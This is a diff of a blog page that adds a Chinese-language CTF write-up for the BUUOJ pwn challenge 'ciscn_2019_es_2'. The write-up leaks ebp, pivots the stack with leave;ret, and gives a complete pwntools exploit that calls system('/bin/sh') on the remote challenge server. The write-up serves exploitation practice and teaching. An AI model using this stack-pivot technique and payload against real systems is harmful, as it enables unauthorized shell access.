@@ -103,8 +103,14 @@
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/del.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/free.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/flag-1597045678391.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/check-1597130777593.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/vuln-1597130791197.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/system.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/leave.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/test-1597131083702.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/flag-1597131199054.png">
 <meta property="article:published_time" content="2020-07-20T01:15:56.000Z">
-<meta property="article:modified_time" content="2020-08-10T07:48:00.594Z">
+<meta property="article:modified_time" content="2020-08-11T07:37:08.292Z">
 <meta property="article:author" content="caiii-vegtable">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://caiii-vegtable.github.io/image/buu/2.png">
@@ -377,6 +383,25 @@
 
 <p>效果</p>
 <p><img src="/image/buu/flag-1597045678391.png" alt="flag"></p>
+<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>check</p>
+<p><img src="/image/buu/check-1597130777593.png" alt="check"></p>
+<p>vuln函数</p>
+<p><img src="/image/buu/vuln-1597130791197.png" alt="vuln"></p>
+<p>是两个输入输出。可以看到栈溢出，但是只能覆盖到返回地址。</p>
+<p>存在system函数</p>
+<p><img src="/image/buu/system.png" alt="system"></p>
+<p>需要/bin/sh</p>
+<p>思路：栈迁移。通过第一个输入输出泄露ebp。</p>
+<p>leave；ret地址</p>
+<p><img src="/image/buu/leave.png" alt="leave"></p>
+<p>先测试s到ebp的偏移</p>
+<p><img src="/image/buu/test-1597131083702.png" alt="test"></p>
+<p>偏移为0xffffd048-0xffffd010=0x38</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29591</span>)</span><br><span class="line"><span class="comment">#p=process('./ciscn_2019_es_2')</span></span><br><span class="line">elf=ELF(<span class="string">'./ciscn_2019_es_2'</span>)</span><br><span class="line"></span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line">leave_ret=<span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x24</span>+<span class="string">'b'</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">'name?\n'</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">4</span>)</span><br><span class="line">ebp_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(ebp_addr)</span><br><span class="line">s_addr=ebp_addr<span class="number">-0x38</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">4</span>+p32(system_plt)+<span class="string">'b'</span>*<span class="number">4</span>+p32(s_addr+<span class="number">0x10</span>)+<span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">payload2+=p32(s_addr)+p32(leave_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/image/buu/flag-1597131199054.png" alt="flag"></p>
 
       
     </div>
@@ -531,7 +556,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babyrop2"><span class="nav-text">bjdctf_2020_babyrop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-3"><span class="nav-text">ciscn_2019_n_3</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babyrop2"><span class="nav-text">bjdctf_2020_babyrop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-3"><span class="nav-text">ciscn_2019_n_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-es-2"><span class="nav-text">ciscn_2019_es_2</span></a></li></ol></div>
             
 
           </div>
